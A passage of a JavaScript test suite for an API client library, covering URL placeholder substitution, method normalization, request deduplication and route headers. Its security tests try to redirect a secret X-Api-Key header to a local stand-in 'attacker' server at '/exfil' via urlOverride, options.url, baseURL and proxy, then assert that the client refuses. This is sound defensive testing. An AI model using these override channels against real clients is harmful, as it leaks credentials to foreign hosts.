        message: createRec
          ? `HAND-BUILT config (bypasses configureMinder()'s own normalization), route declared method:'get' (lowercase) — operations.create() sent POST ${urlBase}`
          : `operations.create() did not send POST ${urlBase} on a hand-built config's method:'get' route — records: ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * MEDIUM — non-global `:id` replace. A route whose URL uses the SAME
   * ':id' placeholder MORE THAN ONCE (an unusual but legal shape). Before
   * the fix, `url.replace(':id', ...)` (a plain-string, non-global replace)
   * substituted only the FIRST occurrence, leaving every subsequent one as a
   * literal, unresolved ':id' token on the wire.
   */
  async function repeatedIdPlaceholderCase(mdp) {
    const routeName = 'mirrorThing';
    recorder.clear();
    const { box, unmount } = await mountProviderHookWithOptions(
      mdp,
      routeName,
      { autoFetch: false },
      { apiUrl: recorder.baseUrl, routes: { [routeName]: { method: 'PUT', url: '/mirror/:id/vs/:id' } } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      await box.current.operations.update('42', { note: 'sync' });
      const rec = recorder.records[recorder.records.length - 1];
      const expectedUrl = '/mirror/42/vs/42';
      const pass = !!rec && rec.method === 'PUT' && rec.url === expectedUrl;
      results.push({
        id: 'medium-repeated-id-placeholder-both-substituted',
        pass,
        message: pass
          ? `route '/mirror/:id/vs/:id' (':id' used TWICE) — operations.update('42', ...) sent ${rec.method} ${rec.url}, both occurrences substituted`
          : rec
            ? `operations.update('42', ...) sent ${rec.method} ${rec.url}, expected PUT ${expectedUrl} — a repeated ':id' placeholder left a literal ':id' token on the wire`
            : `operations.update('42', ...) sent NOTHING`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * HIGH — raw-path dispatch silently drops route configuration. The Golden
   * Path route below carries a custom header the ORIGINAL registered route
   * declares (`headers: { 'X-Test-Route-Header': ... }`). Before the fix,
   * `operations.create()`/the mount-time auto-fetch on this route dispatched
   * through `ApiClient.requestRaw` (an UNREGISTERED raw path standing in for
   * the stripped collection URL) — which never reads `route.headers` at
   * all — so this header silently never reached the wire. After the fix,
   * dispatch stays THROUGH the registered route (only the URL is swapped via
   * `urlOverride`), so the header must actually arrive.
   */
  async function collectionFormPreservesHeadersCase(mdp, urlBase) {
    const routeName = 'hdrItem';
    recorder.clear();
    const { box, unmount } = await mountProviderHook(
      mdp,
      routeName,
      {
        apiUrl: recorder.baseUrl,
        routes: {
          [routeName]: {
            method: 'GET',
            url: `${urlBase}/:id`,
            headers: { 'X-Test-Route-Header': 'route-config-preserved' },
          },
        },
      },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      await waitFor(() => recorder.records.length > 0, { timeout: 2000 });
      recorder.clear();

      // recordMatching, not "last record" — see its own doc comment (the
      // default-options query's invalidateQueries-triggered background
      // refetch can race ahead of the mutation's own request).
      await box.current.operations.create({ name: 'hello' });
      const createRec = recordMatching('POST', urlBase);
      const headerValue = createRec?.headers?.['x-test-route-header'];
      const pass = !!createRec && headerValue === 'route-config-preserved';
      results.push({
        id: 'high-collection-form-create-preserves-route-headers',
        pass,
        message: pass
          ? `operations.create() on the collection-form (id-stripped) dispatch sent POST ${urlBase} WITH the route's own custom header intact`
          : createRec
            ? `operations.create() sent POST ${urlBase} but header 'x-test-route-header' was ${JSON.stringify(headerValue)}, expected 'route-config-preserved' — the registered route's config was dropped`
            : `operations.create() did not send POST ${urlBase} — records: ${JSON.stringify(recorder.records)}`,
      });

      recorder.clear();
      await box.current.operations.fetch();
      const fetchRec = recordMatching('GET', urlBase);
      const fetchHeaderValue = fetchRec?.headers?.['x-test-route-header'];
      const fetchPass = !!fetchRec && fetchHeaderValue === 'route-config-preserved';
      results.push({
        id: 'high-collection-form-fetch-preserves-route-headers',
        pass: fetchPass,
        message: fetchPass
          ? `operations.fetch() on the collection-form dispatch sent ${fetchRec.method} ${fetchRec.url} WITH the route's own custom header intact`
          : fetchRec
            ? `operations.fetch() sent ${fetchRec.method} ${fetchRec.url} but header 'x-test-route-header' was ${JSON.stringify(fetchHeaderValue)}, expected 'route-config-preserved'`
            : `operations.fetch() did not send GET ${urlBase} — records: ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * MEDIUM regression guard — a NON-TERMINAL ':id' (e.g. '/nested-items/:id/comments',
   * a nested sub-resource) must NEVER be silently treated as Golden-Path
   * collection-eligible — stripping the MIDDLE segment would fabricate
   * '/nested-items/comments', a URL with no real collection meaning. Mounted
   * with DEFAULT options (no autoFetch:false): the whole hook must still
   * report the route as INVALID (operations undefined, a clear "requires
   * parameters" error) exactly as it did before the Golden Path fix — proving
   * the fix widened the TERMINAL-':id' case only, not every route that merely
   * CONTAINS ':id' somewhere.
   */
  async function nonTerminalIdStillRequiresParamsCase(mdp) {
    const routeName = 'nestedComments';
    recorder.clear();
    const { box, unmount } = await mountProviderHook(mdp, routeName, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/nested-items/:id/comments' } },
    });
    try {
      await waitFor(() => box.current !== undefined, { timeout: 2000 });
      const zeroRequests = recorder.records.length === 0;
      const stillInvalid = box.current.operations === undefined && box.current.error != null;
      const pass = zeroRequests && stillInvalid;
      results.push({
        id: 'medium-nonterminal-id-route-still-requires-params',
        pass,
        message: pass
          ? `a route with a NON-TERMINAL ':id' ('/nested-items/:id/comments') mounted with default options correctly stayed INVALID (operations undefined, error: "${box.current.error?.message}") instead of silently fabricating a collection URL`
          : `route '/nested-items/:id/comments': operations=${JSON.stringify(box.current.operations)}, error=${box.current.error}, requests sent=${recorder.records.length} (${JSON.stringify(recorder.records)}) — the non-terminal ':id' guard did not hold`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * N1 regression guard — a GET route whose TERMINAL ':id' is eligible for
   * stripping, but where an EARLIER placeholder (':orgId') would STILL be
   * unresolved after stripping just the id, must remain INVALID by default
   * — proves `collapsesToValidCollection` (computeRouteValidation) does not
   * over-broaden the Golden Path exemption to routes that need MORE than
   * just the id.
   */
  async function otherPlaceholderStillRequiredCase(mdp) {
    const routeName = 'orgItem';
    recorder.clear();
    const { box, unmount } = await mountProviderHook(mdp, routeName, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/orgs/:orgId/items/:id' } },
    });
    try {
      await waitFor(() => box.current !== undefined, { timeout: 2000 });
      const zeroRequests = recorder.records.length === 0;
      const stillInvalid = box.current.operations === undefined && box.current.error != null;
      const pass = zeroRequests && stillInvalid;
      results.push({
        id: 'n1-golden-path-other-placeholder-still-required',
        pass,
        message: pass
          ? `route '/orgs/:orgId/items/:id' mounted with default options correctly stayed INVALID (error: "${box.current.error?.message}") — stripping ':id' alone still leaves ':orgId' unresolved`
          : `route '/orgs/:orgId/items/:id': operations=${JSON.stringify(box.current.operations)}, error=${box.current.error}, requests sent=${recorder.records.length} — the Golden Path exemption over-broadened past routes needing MORE than just the id`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * fix-2.2.0-blockers (REDESIGN — ResolvedRequest, headline acceptance
   * test #1): TWO CONCURRENT `operations.create()` calls on a hand-authored
   * GET base route with NO create-sibling (so `resolveCrudOperationRoute`
   * resolves via the base-route METHOD OVERRIDE — the base route's DECLARED
   * method stays 'GET' while the actual dispatched method is 'POST') must
   * produce TWO POSTs, not one. Before the fix, the in-flight cache-key/
   * dedup gating re-read the DECLARED `route.method` ('GET') instead of the
   * RESOLVED/dispatched method ('POST'), so both concurrent creates computed
   * the SAME (wrongly-GET-classified) cache key and the second was silently
   * satisfied by the first's in-flight promise — one real POST reached the
   * wire for two calls.
   */
  async function concurrentCreatesProduceTwoPostsCase(mdp, urlBase) {
    const routeName = 'rrConcurrentThing';
    recorder.clear();
    const { box, unmount } = await mountProviderHookWithOptions(
      mdp,
      routeName,
      { autoFetch: false },
      { apiUrl: recorder.baseUrl, routes: { [routeName]: { method: 'GET', url: urlBase } } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      await Promise.all([
        box.current.operations.create({}),
        box.current.operations.create({}),
      ]);
      const postCount = recorder.records.filter((r) => r.method === 'POST' && r.url === urlBase).length;
      const pass = postCount === 2;
      results.push({
        id: 'rr-concurrent-creates-produce-two-posts',
        pass,
        message: pass
          ? `two concurrent operations.create() calls on the SAME GET base route (method-override dispatch) produced TWO independent POSTs to ${urlBase}`
          : `two concurrent operations.create() calls produced ${postCount} POST(s) to ${urlBase} (expected 2) — records: ${JSON.stringify(recorder.records)}. This is the exact "declared route.method used for dedup instead of the resolved/dispatched method" defect.`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * fix-2.2.0-blockers (REDESIGN — ResolvedRequest, headline acceptance
   * test #2, THE WORST OBSERVED FAILURE MODE): a concurrent `refetch()`
   * (a genuine GET on the collection route) and `operations.create({})`
   * (dispatches POST via the SAME base route's method override) share the
   * SAME url/body — before the fix, both computed the IDENTICAL cache key
   * (both keyed on the DECLARED 'GET'), so create()'s call could be
   * satisfied by refetch()'s own in-flight GET promise: ZERO POSTs reached
   * the wire while create() still reported success. Mounted with DEFAULT
   * options (the base route's own auto-fetch fires once on mount; cleared
   * before the concurrent pair below) so `refetch()` exercises the REAL
   * query path, not a synthetic stand-in.
   */
  async function concurrentRefetchAndCreateBothReachWireCase(mdp, urlBase) {
    const routeName = 'rrConcurrentThing2';
    recorder.clear();
    const { box, unmount } = await mountProviderHook(
      mdp,
      routeName,
      { apiUrl: recorder.baseUrl, routes: { [routeName]: { method: 'GET', url: urlBase } } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      await waitFor(() => recorder.records.length > 0, { timeout: 2000 });
      recorder.clear();

      await Promise.all([box.current.refetch(), box.current.operations.create({})]);

      const getCount = recorder.records.filter((r) => r.method === 'GET' && r.url === urlBase).length;
      const postCount = recorder.records.filter((r) => r.method === 'POST' && r.url === urlBase).length;
      const pass = getCount >= 1 && postCount === 1;
      results.push({
        id: 'rr-concurrent-refetch-and-create-both-reach-wire',
        pass,
        message: pass
          ? `concurrent refetch() + operations.create({}) on the SAME collection route both independently reached the wire (${getCount} GET, ${postCount} POST to ${urlBase}) — create()'s POST was not silently swallowed by refetch()'s GET`
          : `concurrent refetch() + operations.create({}) sent ${getCount} GET / ${postCount} POST to ${urlBase} (expected >=1 GET, exactly 1 POST) — records: ${JSON.stringify(recorder.records)}. postCount===0 is the exact "phantom success, zero POSTs" defect.`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * fix-2.2.0-blockers (REDESIGN — ResolvedRequest, headline acceptance
   * test #3): a HAND-BUILT route declaring `method: 'POST '` (trailing
   * whitespace — never passed through configureMinder()'s own boundary
   * normalization) must dispatch a clean POST, not throw. Before the fix,
   * the untrimmed method string reached axios/the transport verbatim,
   * producing ZERO wire requests and a raw
   * `TypeError: Cannot read properties of undefined (reading '_retryCount')`
   * instead of a real request.
   */
  async function untrimmedMethodHandBuiltDispatchesCase(mdp, urlBase) {
    const routeName = 'rrUntrimmedMethod';
    recorder.clear();
    const rawConfig = {
      apiBaseUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'POST ', url: urlBase } },
    };
    const { box, unmount } = await mountProviderHookHandBuilt(
      mdp,
      routeName,
      {},
      rawConfig,
      (r) => r !== undefined,
    );
    try {
      let threw = false;
      let errMessage = '';
      try {
        await box.current.mutate({ note: 'hi' });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const rec = recordMatching('POST', urlBase);
      const pass = !threw && !!rec;
      results.push({
        id: 'rr-untrimmed-method-handbuilt-dispatches',
        pass,
        message: pass
          ? `HAND-BUILT config route declared method:'POST ' (trailing space, never normalized by configureMinder()) — mutate() sent a clean POST ${urlBase} instead of throwing`
          : threw
            ? `mutate() on a hand-built method:'POST ' route THREW instead of dispatching: ${errMessage}`
            : `mutate() did not send POST ${urlBase} — records: ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * fix-2.2.0-blockers (REDESIGN — P11, adversarial re-probe, headline
   * acceptance test #4a): `GET /p11/:id/mirror/:id` — a REPEATED ':id'
   * placeholder where the LAST segment is also ':id' (so the old,
   * over-broad `stripIdPathSegment` treated BOTH occurrences as eligible for
   * removal) — mounted with DEFAULT options (no autoFetch:false, no
   * params.id) must NEVER silently fabricate the collection URL
   * '/p11/mirror' (a URL that answers a DIFFERENT, unintended question).
   * Correct behavior: the route stays INVALID (operations undefined, a
   * clear "requires parameters" error) — mirrors
   * `otherPlaceholderStillRequiredCase`'s pattern, proving
   * `collapsesToFullyResolvedCollection` correctly refuses to collapse when
   * a NON-terminal occurrence of the SAME placeholder would still be
   * unresolved.
   */
  async function p11RepeatedTerminalPlaceholderRefusesCase(mdp) {
    const routeName = 'p11Mirror';
    recorder.clear();
    const { box, unmount } = await mountProviderHook(mdp, routeName, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/p11/:id/mirror/:id' } },
    });
    try {
      await waitFor(() => box.current !== undefined, { timeout: 2000 });
      const zeroRequests = recorder.records.length === 0;
      const stillInvalid = box.current.operations === undefined && box.current.error != null;
      const pass = zeroRequests && stillInvalid;
      results.push({
        id: 'rr-p11-repeated-terminal-placeholder-refuses',
        pass,
        message: pass
          ? `route '/p11/:id/mirror/:id' (repeated ':id', terminal AND non-terminal) mounted with default options correctly stayed INVALID (error: "${box.current.error?.message}") and NEVER fabricated '/p11/mirror'`
          : `route '/p11/:id/mirror/:id': operations=${JSON.stringify(box.current.operations)}, error=${box.current.error}, requests sent=${recorder.records.length} (${JSON.stringify(recorder.records)}) — the repeated-terminal-placeholder guard did not hold (fabrication risk: '/p11/mirror')`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * fix-2.2.0-blockers (REDESIGN — P11, adversarial re-probe, headline
   * acceptance test #4b): the SAME repeated-placeholder route, but through
   * `operations.create()` specifically — `operations` is exposed regardless
   * of the whole hook's route validity (unlike the GET/auto-fetch path), so
   * THIS is the only guard standing between the route and a broken/
   * fabricated dispatch on the create() path. Must throw a directed error
   * with ZERO requests reaching the wire — never fabricate '/p11/mirror',
   * never dispatch the raw, still-placeholder-carrying URL.
   */
  async function p11CreateUnresolvableCollectionRefusesCase(mdp) {
    const routeName = 'p11MirrorCreate';
    recorder.clear();
    const { box, unmount } = await mountProviderHookWithOptions(
      mdp,
      routeName,
      { autoFetch: false },
      { apiUrl: recorder.baseUrl, routes: { [routeName]: { method: 'GET', url: '/p11create/:id/mirror/:id' } } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      let threw = false;
      let errMessage = '';
      try {
        await box.current.operations.create({});
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const zeroRequests = recorder.records.length === 0;
      const pass = threw && zeroRequests;
      results.push({
        id: 'rr-p11-create-unresolvable-collection-refuses',
        pass,
        message: pass
          ? `operations.create() on route '/p11create/:id/mirror/:id' (repeated ':id') refused with a directed error ("${errMessage}") and never touched the wire`
          : threw
            ? `operations.create() threw ("${errMessage}") but ${recorder.records.length} request(s) still reached the wire: ${JSON.stringify(recorder.records)}`
            : `operations.create() did NOT throw — it silently sent ${recorder.records.length} request(s): ${JSON.stringify(recorder.records)} (fabrication/broken-dispatch risk)`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * SECURITY item 2 (fix-2.2.0-blockers, adversarial re-probe — credential
   * exfiltration). `apiClient.request()` is called DIRECTLY (bypassing
   * `useMinder()`'s hook-level helpers entirely — this is the exact surface
   * the architect's probe used) with a `urlOverride` pointing at a SECOND,
   * independent recording server standing in for an attacker-controlled
   * host. The route declares a static `X-Api-Key` header. Must: (a) throw
   * before dispatch, (b) send ZERO requests to EITHER server, and (c) the
   * secret header must never appear on the attacker server even if some
   * other code path let a request through — checked explicitly, not just
   * inferred from "zero requests".
   */
  async function securityUrlOverrideCrossOriginRefusesCase(mdp) {
    const routeName = 'secThing';
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things/:id', headers: { 'X-Api-Key': 'SUPER-SECRET' } } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, undefined, { id: '1' }, { urlOverride: `${attacker.baseUrl}/exfil` });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const keyLeaked = attacker.records.some((r) => r.headers['x-api-key'] === 'SUPER-SECRET');
      const pass = threw && !legitTouched && !attackerTouched && !keyLeaked;
      results.push({
        id: 'sec-urloverride-cross-origin-refuses-no-header-leak',
        pass,
        message: pass
          ? `apiClient.request() with a cross-origin urlOverride ("${attacker.baseUrl}/exfil") refused ("${errMessage}") before dispatch — the route's X-Api-Key header reached NEITHER server (legit=${recorder.records.length}, attacker=${attacker.records.length})`
          : `SECURITY FAILURE: threw=${threw} ("${errMessage}"), legit requests=${recorder.records.length}, attacker requests=${attacker.records.length}, key leaked to attacker=${keyLeaked}`,
      });
    } finally {
      unmount();
      await attacker.close();
    }
  }

  /**
   * SECURITY item 2 — POSITIVE CONTROL. The SAME direct `apiClient.request()`
   * surface, but with the kind of override the fix must still allow: a
   * plain, same-origin PATH (exactly what `useMinder.helpers.ts`'s
   * `stripIdPathSegment` always produces). Proves the new boundary is
   * path-only-safe, not "urlOverride never works again".
   */
  async function securityUrlOverridePathOnlyStillResolvesCase(mdp) {
    const routeName = 'secThing2';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things2/:id' } },
    });
    try {
      const apiClient = box.current.apiClient;
      await apiClient.request(routeName, undefined, undefined, { urlOverride: '/things2' });
      const rec = recorder.records[recorder.records.length - 1];
      const pass = !!rec && rec.method === 'GET' && rec.url === '/things2';
      results.push({
        id: 'sec-urloverride-path-only-still-resolves',
        pass,
        message: pass
          ? `apiClient.request() with a legitimate PATH-ONLY urlOverride ('/things2') still resolved and dispatched GET /things2 — the security boundary does not break the legitimate internal use`
          : `path-only urlOverride unexpectedly failed to dispatch: ${rec ? `${rec.method} ${rec.url}` : 'NOTHING'}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * SECURITY item 2, CHANNEL 2 (fix-2.2.0-blockers, adversarial re-probe
   * ROUND 2 — credential exfiltration still open after the `urlOverride`
   * guard alone). The `urlOverride` fix only closed ONE field name.
   * `apiClient.request()` is called DIRECTLY with a RAW axios `options.url`
   * (never `urlOverride`) pointing at a SECOND, independent recording
   * server. Before this fix `otherOptions` spread AFTER `url:` in the
   * outgoing axios config, so this option won outright — recorded wire
   * evidence was `GET /exfil x-api-key=SUPER-SECRET` with no throw. Must
   * now: (a) throw before dispatch, (b) send ZERO requests to EITHER
   * server, (c) never leak the key.
   */
  async function securityRawUrlOptionCrossOriginRefusesCase(mdp) {
    const routeName = 'secThingUrl';
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things/:id', headers: { 'X-Api-Key': 'SUPER-SECRET' } } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, undefined, { id: '1' }, { url: `${attacker.baseUrl}/exfil` });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const keyLeaked = attacker.records.some((r) => r.headers['x-api-key'] === 'SUPER-SECRET');
      const pass = threw && !legitTouched && !attackerTouched && !keyLeaked;
      results.push({
        id: 'sec-options-url-cross-origin-refuses-no-header-leak',
        pass,
        message: pass
          ? `apiClient.request() with a raw options.url ("${attacker.baseUrl}/exfil", NOT urlOverride) refused ("${errMessage}") before dispatch — the route's X-Api-Key header reached NEITHER server (legit=${recorder.records.length}, attacker=${attacker.records.length})`
          : `SECURITY FAILURE: threw=${threw} ("${errMessage}"), legit requests=${recorder.records.length}, attacker requests=${attacker.records.length}, key leaked to attacker=${keyLeaked}`,
      });
    } finally {
      unmount();
      await attacker.close();
    }
  }

  /**
   * SECURITY item 2, CHANNEL 3 (adversarial re-probe ROUND 2):
   * `options.baseURL` pointing at a SECOND, independent recording server.
   * Before this fix, `otherOptions` carried `baseURL` straight into the
   * outgoing axios config and axios dispatched there with the route's own
   * headers attached — recorded wire evidence was `GET /things/1
   * x-api-key=SUPER-SECRET` on the attacker host.
   */
  async function securityBaseUrlOptionCrossOriginRefusesCase(mdp) {
    const routeName = 'secThingBaseUrl';
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things/:id', headers: { 'X-Api-Key': 'SUPER-SECRET' } } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, undefined, { id: '1' }, { baseURL: attacker.baseUrl });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const keyLeaked = attacker.records.some((r) => r.headers['x-api-key'] === 'SUPER-SECRET');
      const pass = threw && !legitTouched && !attackerTouched && !keyLeaked;
      results.push({
        id: 'sec-options-baseurl-cross-origin-refuses-no-header-leak',
        pass,
        message: pass
          ? `apiClient.request() with options.baseURL ("${attacker.baseUrl}") refused ("${errMessage}") before dispatch — the route's X-Api-Key header reached NEITHER server (legit=${recorder.records.length}, attacker=${attacker.records.length})`
          : `SECURITY FAILURE: threw=${threw} ("${errMessage}"), legit requests=${recorder.records.length}, attacker requests=${attacker.records.length}, key leaked to attacker=${keyLeaked}`,
      });
    } finally {
      unmount();
      await attacker.close();
    }
  }

  /**
   * SECURITY item 2, CHANNEL 4 (adversarial re-probe ROUND 2): axios's OWN
   * `proxy` option pointing at a SECOND, independent recording server. Axios
   * CONNECTs through the given host:port as an HTTP proxy and hands it the
   * ENTIRE absolute-form request line — method, path, AND headers — even
   * though the resolved `url` itself is never touched. Wire evidence before
   * this fix: the attacker host recorded an ABSOLUTE-FORM request
   * (`http://<legit-host>/things/1`) carrying the route's X-Api-Key, because
   * it was acting as the HTTP proxy, not the destination.
   */
  async function securityProxyOptionCrossOriginRefusesCase(mdp) {
    const routeName = 'secThingProxy';
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const attackerUrl = new URL(attacker.baseUrl);
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things/:id', headers: { 'X-Api-Key': 'SUPER-SECRET' } } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, undefined, { id: '1' }, {
          proxy: { host: attackerUrl.hostname, port: Number(attackerUrl.port) },
        });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const keyLeaked = attacker.records.some((r) => r.headers['x-api-key'] === 'SUPER-SECRET');
      const pass = threw && !legitTouched && !attackerTouched && !keyLeaked;
      results.push({
        id: 'sec-options-proxy-cross-origin-refuses-no-header-leak',
        pass,
        message: pass
          ? `apiClient.request() with options.proxy pointing at ${attacker.baseUrl} refused ("${errMessage}") before dispatch — the route's X-Api-Key header reached NEITHER server (legit=${recorder.records.length}, attacker=${attacker.records.length})`
          : `SECURITY FAILURE: threw=${threw} ("${errMessage}"), legit requests=${recorder.records.length}, attacker requests=${attacker.records.length}, key leaked to attacker=${keyLeaked}`,
      });
    } finally {
      unmount();
      await attacker.close();
    }
  }

  /**
   * SECURITY item 2, "next round" family (adversarial re-probe ROUND 2): the
   * fix must be a design-level ALLOWLIST, not a denylist of just the three
   * channels above — proves it by attempting `adapter`/`transformRequest`/
   * `httpAgent` TOGETHER, exactly the family the task brief warns a denylist
   * would simply move the problem to. None of these "point at" a host by
   * themselves, so this case only asserts the refusal + zero requests to the
   * LEGIT server — the point is these never even get a chance to run.
   */
  async function securityTransportHijackFamilyRefusesCase(mdp) {
    const routeName = 'secThingTransport';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things/:id', headers: { 'X-Api-Key': 'SUPER-SECRET' } } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errCode;
      let errMessage = '';
      // `adapterCalled` is a CANARY, not the pass condition by itself: if the
      // allowlist guard is ever weakened/removed, `adapter` would reach axios
      // and axios would actually INVOKE it — flipping this to true even
      // though the canary also throws from inside itself. Asserting BOTH
      // `!adapterCalled` AND the specific `UNSAFE_REQUEST_OPTION_OVERRIDE`
      // error code (not just "something threw") is what stops this case from
      // passing for the wrong reason.
      let adapterCalled = false;
      try {
        await apiClient.request(routeName, undefined, { id: '1' }, {
          adapter: () => {
            adapterCalled = true;
            throw new Error('adapter should never run');
          },
          transformRequest: [(d) => d],
          httpAgent: {},
        });
      } catch (e) {
        threw = true;
        errCode = e?.code;
        errMessage = e?.message ?? String(e);
      }
      const legitTouched = recorder.records.length > 0;
      const pass = threw && !adapterCalled && !legitTouched && errCode === 'UNSAFE_REQUEST_OPTION_OVERRIDE';
      results.push({
        id: 'sec-options-transport-hijack-family-refuses',
        pass,
        message: pass
          ? `apiClient.request() with { adapter, transformRequest, httpAgent } together refused with code "${errCode}" ("${errMessage}") before dispatch — the canary adapter was NEVER invoked and zero requests reached the wire, proving the fix is an ALLOWLIST (closes the whole family) and not a denylist of just url/baseURL/proxy`
          : `SECURITY FAILURE: threw=${threw} (code="${errCode}", "${errMessage}"), adapter WAS invoked=${adapterCalled}, legit requests=${recorder.records.length}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * DEDUP/CACHE-KEY (fix-2.2.0-blockers, adversarial re-probe ROUND 2 —
   * "phantom success" reopened). The EXACT reported repro: two CONCURRENT
   * `apiClient.request()` calls, each supplying a DIFFERENT raw
   * `options.url` (never `urlOverride`). Before this fix both resolved to
   * the IDENTICAL `resolved.url` (the route's own declared URL, untouched by
   * either override) and therefore produced the IDENTICAL dedup cache key,
   * while dispatch used whichever `otherOptions.url` won: ONE wire request
   * reached '/alpha' and BOTH callers received the '/alpha' body. With the
   * origin/transport guard in place, EACH call must independently refuse
   * before ever reaching the dedup/cache layer — zero wire requests, and
   * neither call can silently receive the other's response.
   */
  async function securityConcurrentDistinctUrlOverridesBothRefuseCase(mdp) {
    const routeName = 'secThingDedup';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/dedup-base' } },
      performance: { deduplication: true },
    });
    try {
      const apiClient = box.current.apiClient;
      const callA = apiClient.request(routeName, undefined, undefined, { url: '/alpha' }).then(
        (data) => ({ threw: false, data }),
        (e) => ({ threw: true, message: e?.message ?? String(e) }),
      );
      const callB = apiClient.request(routeName, undefined, undefined, { url: '/beta' }).then(
        (data) => ({ threw: false, data }),
        (e) => ({ threw: true, message: e?.message ?? String(e) }),
      );
      const [resultA, resultB] = await Promise.all([callA, callB]);
      const zeroRequests = recorder.records.length === 0;
      const pass = resultA.threw && resultB.threw && zeroRequests;
      results.push({
        id: 'sec-dedup-concurrent-distinct-url-overrides-both-refuse-no-collapse',
        pass,
        message: pass
          ? `two concurrent apiClient.request() calls with DIFFERENT raw options.url ('/alpha', '/beta') BOTH refused independently ("${resultA.message}" / "${resultB.message}") — zero wire requests, so they could not collapse into one shared response the way the reported repro did`
          : `SECURITY/DEDUP FAILURE: callA threw=${resultA.threw}, callB threw=${resultB.threw}, wire requests=${recorder.records.length}: ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * POSITIVE CONTROL (fix-2.2.0-blockers, adversarial re-probe ROUND 2): the
   * SAME direct `apiClient.request()` surface, given ONLY allowlisted
   * per-call options (`timeout`, `responseType`) that never touch
   * destination/transport. Must still dispatch normally to the LEGIT server
   * with the route's own header intact — proves the allowlist is not
   * over-broad and did not silently break ordinary per-call option usage.
   */
  async function securityAllowlistedOptionsStillForwardCase(mdp) {
    const routeName = 'secThingAllowlist';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things/:id', headers: { 'X-Api-Key': 'SUPER-SECRET' } } },
    });
    try {
      const apiClient = box.current.apiClient;
      await apiClient.request(routeName, undefined, { id: '9' }, { timeout: 15000, responseType: 'json' });
      const rec = recorder.records[recorder.records.length - 1];
      const pass = !!rec && rec.method === 'GET' && rec.url === '/things/9' && rec.headers['x-api-key'] === 'SUPER-SECRET';
      results.push({
        id: 'sec-options-allowlisted-keys-still-forward-positive-control',
        pass,
        message: pass
          ? `apiClient.request() with ONLY allowlisted options ({timeout, responseType}) still dispatched GET /things/9 with X-Api-Key intact — the allowlist does not break legitimate per-call options`
          : `allowlisted-only options unexpectedly failed to dispatch normally: ${rec ? `${rec.method} ${rec.url} key=${rec.headers['x-api-key']}` : 'NOTHING'}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * SECURITY, NON-BLOCKING HARDENING (fix-2.2.0-blockers, adversarial
   * re-probe ROUND 2 — cross-origin redirect header leak). A real cross-
   * origin 302: the route's OWN, trusted host redirects (`Location`) to a
   * SECOND, independent server standing in for an attacker-controlled host.
   * follow-redirects (axios's Node http adapter) transparently follows it
